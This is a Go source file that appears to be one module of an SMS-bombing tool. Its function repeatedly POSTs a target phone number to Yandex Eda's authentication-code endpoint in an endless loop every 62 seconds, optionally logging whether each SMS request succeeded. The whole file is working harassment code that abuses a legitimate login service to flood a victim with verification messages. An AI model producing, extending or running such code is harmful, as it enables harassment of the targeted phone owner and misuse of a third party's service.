package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func yandeda() {
	req := newreq()
	req.SetBodyString(`{"phone_number":"` + num[1:] + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://eda.yandex/api/v1/user/request_authentication_code")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var (
			err  error
			body string
		)
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			body = string(res.Body())
			if err == nil && strings.Index(body, "err") == -1 && strings.Index(body, `"delay"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
